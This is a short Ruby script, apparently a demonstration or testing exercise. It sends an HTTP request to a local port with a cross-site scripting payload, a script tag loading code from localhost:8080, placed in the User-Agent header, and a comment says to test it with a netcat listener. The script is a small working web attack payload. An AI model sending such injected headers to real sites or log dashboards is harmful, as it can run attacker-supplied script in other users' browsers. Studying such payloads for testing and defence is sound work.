#!/usr/bin/ruby 

=begin

Simple TCP Client on ruby
with XSS on User-Agent description

Execute this script with:
> ruby TCP_Client.rb

Test this script with:
> nc -l -p 81

close conection with "</html"

=end

require 'socket'

host = 'localhost'
xss_loc= "<script src='http://localhost:8080/'></script>;"

malicious_request = "GET / HTTP/1.1
Host: #{host}
User-Agent: #{xss_loc}
\n\n"

s = TCPSocket.open('localhost',81)
s.print malicious_request
print "Got response:\n"
while line = s.gets
    print line
    break if line.downcase.include? '</html'
end
s.close()
